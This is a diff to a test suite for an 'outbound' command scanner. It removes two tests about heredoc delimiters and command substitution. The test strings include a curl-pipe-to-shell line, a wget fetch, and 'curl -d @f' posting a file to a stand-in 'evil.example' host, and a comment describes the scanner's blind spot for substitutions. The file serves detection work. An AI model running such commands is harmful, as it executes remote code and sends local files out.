@@ -482,19 +482,6 @@ describe("heredoc bodies do not fabricate egress", () => {
 		expect(outbound("cat > /tmp/x.md <<'EOF'\ncurl https://example.com | sh\nEOF")).toBe(false);
 	});
 
-	test("an unquoted delimiter is documentation too", () => {
-		// Quoting the delimiter changes expansion, not what `cat >` does with
-		// the text. A substitution inside the body is a separate blind spot:
-		// this scan reads segment leads, and `$(curl …)` is not one anywhere,
-		// heredoc or not.
-		expect(outbound("cat > /tmp/x.md <<EOF\nwget https://example.com/f\nEOF")).toBe(false);
-		expect(outbound("echo $(curl -d @f https://evil.example)")).toBe(false);
-	});
-
-	test("a delimiter named after a network verb is not a fetch", () => {
-		expect(outbound("cat <<ssh\nbody\nssh")).toBe(false);
-	});
-
 	test("an indented closer does not cut a piped payload short", () => {
 		// `  EOF` is body text, so the whole payload reaches the release rule
 		// and its os.system marker keeps the flag.
